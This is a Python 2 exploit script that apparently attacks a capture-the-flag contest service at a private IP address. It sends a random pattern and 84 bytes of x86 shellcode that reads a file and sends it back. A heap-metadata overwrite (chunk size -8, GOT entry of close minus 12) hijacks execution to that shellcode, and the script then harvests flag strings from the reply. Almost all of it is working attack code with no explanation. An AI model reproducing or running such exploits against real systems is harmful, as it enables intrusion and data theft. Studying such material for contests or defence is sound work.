import struct
import socket
import sys
import binascii
import os
import re

genes = 'ACGT'

def genpat(plen):
   pat = ''
   for i in range(plen):
      n = ord(os.urandom(1)) & 3
      pat += genes[n]
   return pat

#fseek, fread, send loop
readfile = "\xeb\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
readfile += "\x41\x41\x58\x5e\x31\xc0\x50\x50\xb8\x38\xe7\x04\x08\xff\x30\xb8"
readfile += "\xb0\xca\xfd\x07\xff\xd0\x58\x59\x5b\x89\xe7\x50\xb5\xff\x51\x6a"
readfile += "\x01\x57\xb8\x70\xb3\xfe\x07\xff\xd0\x85\xc0\x7e\x10\x53\x50\x57"
readfile += "\x56\xb8\xd0\xb3\xfc\x07\xff\xd0\x83\xc4\x10\xeb\xe5\xb8\x90\x01"
readfile += "\x01\x08\xff\xd0"
# total size: 84 bytes

eip = 0x0804e760  #location of "PATERN MATCHED" buffer
eip += len("PATTERN MATCHED : ")

s = socket.socket()
s.connect(('10.60.123.4', 1013))

patlen = 102 - len(readfile) - 1

pat = genpat(patlen)

payload = pat + " " + readfile + "HHHHHHHHHHHH" + "\xf8\xff\xff\xff" + "\x8c\xe1\x04\x08" + struct.pack("<I", eip + patlen + 1) + "\n"
#                                                 chunk size = -8        got(close)-12             &shellcode
s.send(payload)
sys.stderr.write(s.recv(4096))

s.send(pat + "\n")
sys.stderr.write(s.recv(4096))

s.settimeout(0.5)

res = ''

try:
   regex = '\w{31}='
   flags = s.recv(4096)

   while flags:
      res += flags
      flags = s.recv(4096)
      if not flags:
         break
except:
   pass

m = re.findall(regex, res)
for flag in m:
   print flag
